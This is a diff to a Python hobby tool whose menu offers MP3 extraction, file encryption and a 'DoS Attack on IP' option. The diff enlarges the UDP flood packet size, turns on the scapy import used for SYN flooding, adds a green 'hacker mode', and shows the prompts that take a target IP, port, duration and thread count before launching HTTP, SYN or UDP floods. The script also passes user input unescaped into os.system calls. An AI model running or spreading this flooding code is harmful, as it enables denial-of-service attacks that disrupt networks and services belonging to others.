@@ -5,7 +5,10 @@ import random
 import time
 from cryptography.fernet import Fernet
 import base64
-#from scapy.all import IP, TCP, send
+if os.name =="nt":
+    from scapy.all import IP, TCP, send
+else:
+    pass
 
 numlist = ['1','2','3','4','5','6','7','8','9','0']
 usingThreading = True
@@ -57,7 +60,7 @@ def udp_flood(target_ip, target_port, time_limit):
     while time.time() - start_time < time_limit:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            s.sendto(random._urandom(1024), (target_ip, target_port))
+            s.sendto(random._urandom(2048), (target_ip, target_port))
             s.close()
         except:
             pass
@@ -83,6 +86,7 @@ def clear_terminal():
         os.system("cls")
     else:
         os.system("clear")
+
 
 def print_title():
     if(os.name == "nt"):
@@ -111,10 +115,10 @@ def print_title():
         print_features()
 
 def print_features():
-    if os.name == "nt":
+    if os.name == "nt" and hackerMode == False:
         print("\033[31mWARNING: RECOMMENDED TO RUN IN CMD, NOT POWERSHELL\033[0m")
 
-    print("""
+        print("""
 ▆▅▃▂▁𝐅𝐞𝐚𝐭𝐮𝐫𝐞𝐬▁▂▃▅▆
 ╔═════════════════┃
 ║
@@ -134,10 +138,32 @@ def print_features():
 ║     
 ╚═ 8. Exit
 """)
-print("░▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒░\n")
+    elif os.name == "nt" and hackerMode == True:
+        print("""\033[32m
+▆▅▃▂▁𝐅𝐞𝐚𝐭𝐮𝐫𝐞𝐬▁▂▃▅▆
+╔═════════════════┃
+║
+╠═ 1. Extract MP3 from YouTube link
+║
+╠═ 2. DoS Attack on IP
+║
+╠═ 3. Encrypt a text file
+║
+╠═ 4. Decrypt the encrypted file
+║
+╠═ 5. Compress a file (HUFFMAN - NOT IMPLEMENTED YET)
+║
+╠═ 6. Decompress a file (HUFFMAN - NOT IMPLEMENTED YET)
+║
+╠═ 7. Settings
+║     
+╚═ 8. Exit
+\033[0m""")
+
         
 def print_settings():
-    print(f"""
+    if hackerMode==False:
+        print(f"""
 ▆▅▃▂▁𝐒𝐞𝐭𝐭𝐢𝐧𝐠𝐬▁▂▃▅▆
 ╔═════════════════┃
 ║
@@ -147,6 +173,17 @@ def print_settings():
 ║
 ╚═ 3. Exit settings
 """)
+    elif hackerMode == True:
+        print(f"""\033[32m
+▆▅▃▂▁𝐒𝐞𝐭𝐭𝐢𝐧𝐠𝐬▁▂▃▅▆
+╔═════════════════┃
+║
+╠═ 1. Use threaded port scanning (recommended)      {usingThreading}
+║
+╠═ 2. Green text                                    {hackerMode}
+║
+╚═ 3. Exit settings
+\033[0m""")
 
 clear_terminal()
 
@@ -154,18 +191,24 @@ print_title()
 
 while True:
     try:
-        option = int(input("Select an option: "))
+        if hackerMode == False:
+            option = int(input("Select an option: "))
+        else:
+            option = int(input("\033[32mSelect an option: \033[0m"))
         
         if option == 8:
             print("\nBye")
             break
         
         elif option == 1 and insettings == False:
-            link = input("\nEnter link: ")
+            if hackerMode == False:
+                link = input("\nEnter link: ")
+            else:
+                link = input("\033[32m\nEnter link: \033[0m")
             if os.name == "nt":
                 os.system(f".\helpers\mp3.exe {link}")
             else:
-                os.system(f"./helpers/mp3.exe {link}")
+                os.system(f"./helpers/mp3.out {link}")
             break
         elif option == 1 and insettings == True:
             if usingThreading == False:
@@ -177,8 +220,12 @@ while True:
                 clear_terminal()
                 print_settings()
         elif option == 2 and insettings == False:
-            target_ip = input("\nEnter IP address: ")
-            sfp = input("\nDo you want to scan for open ports? (y/n): ").lower()
+            if hackerMode == True:
+                target_ip = input("\033[32m\nEnter IP address: \033[0m")
+                sfp = input("\033[32m\nDo you want to scan for open ports? (y/n): \033[0m").lower()
+            else:
+                target_ip = input("\nEnter IP address: ")
+                sfp = input("\nDo you want to scan for open ports? (y/n): ").lower()
             if sfp == "y":
                 if usingThreading == True:
                     if os.name == "nt":
@@ -190,23 +237,44 @@ while True:
                         os.system(f"python .\\helpers\\pscan.py {target_ip}")
                     else:
                         os.system(f"\npython ./helpers/pscan.py {target_ip}")
-            target_port = int(input("\nEnter port: "))
+            if hackerMode == True:
+                target_port = int(input("\033[32m\nEnter port: \033[0m"))
+            else:
+                target_port = int(input("\nEnter port: "))
             if target_port < 1 or target_port > 65535:
-                print("Invalid port!")
+                if hackerMode == False:
+                    print("Invalid port!")
+                else:
+                    print("\033[32mInvalid port!\033[0m")
+                pass
+            if hackerMode == False:
+                time_limit = int(input("\nEnter attack duration (seconds): "))
+                threads = int(input("\nEnter number of threads the attack should use: "))
+                if threads > 120:
+                    print("Number of threads too high. Setting to 20.")
+                    threads = 20
+                attack_type = input("\nEnter attack type (http/syn/udp): ").lower()
+                if attack_type not in ["http", "syn", "udp"]:
+                    print("Invalid attack type. Defaulting to HTTP flood.")
+                    attack_type = "http"
+                print("Starting attack...")
+                start_attack(target_ip, target_port, time_limit, threads, attack_type)
+                print("Attack completed.")
                 break
-            time_limit = int(input("\nEnter attack duration (seconds): "))
-            threads = int(input("\nEnter number of threads the attack should use: "))
-            if threads > 120:
-                print("Number of threads too high. Setting to 20.")
-                threads = 20
-            attack_type = input("\nEnter attack type (http/syn/udp): ").lower()
-            if attack_type not in ["http", "syn", "udp"]:
-                print("Invalid attack type. Defaulting to HTTP flood.")
-                attack_type = "http"
-            print("Starting attack...")
-            start_attack(target_ip, target_port, time_limit, threads, attack_type)
-            print("Attack completed.")
-            break
+            elif hackerMode == True:
+                time_limit = int(input("\033[32m\nEnter attack duration (seconds): \033[0m"))
+                threads = int(input("\033[32m\nEnter number of threads the attack should use: \033[0m"))
+                if threads > 120:
+                    print("\033[32mNumber of threads too high. Setting to 20.\033[0m")
+                    threads = 20
+                attack_type = input("\033[32m\nEnter attack type (http/syn/udp): \033[0m").lower()
+                if attack_type not in ["http", "syn", "udp"]:
+                    print("\033[32mInvalid attack type. Defaulting to HTTP flood.\033[0m")
+                    attack_type = "http"
+                print("\033[32mStarting attack...\033[0m")
+                start_attack(target_ip, target_port, time_limit, threads, attack_type)
+                print("\033[32mAttack completed.\033[0m")
+                break
         elif option == 2 and insettings == True:
             if hackerMode == False:
                 hackerMode = True
